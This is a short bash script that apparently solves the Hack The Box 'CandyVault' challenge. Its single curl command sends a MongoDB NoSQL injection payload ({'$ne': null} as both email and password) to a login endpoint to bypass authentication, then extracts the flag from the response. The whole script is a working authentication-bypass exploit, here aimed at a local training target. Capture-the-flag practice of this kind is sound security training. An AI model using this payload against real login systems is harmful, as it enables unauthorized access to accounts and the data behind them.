#!/bin/bash
# https://app.hackthebox.com/challenges/CandyVault
# Tags: NoSQL injection, MongoDB, Authentication Bypass

TARGET=127.0.0.1:1337
FLAG=$(curl -s http://$TARGET/login -H "Content-Type: application/json" -d '{"email": {"$ne": null}, "password": {"$ne": null}}' | grep -oP 'data-text="\KHTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
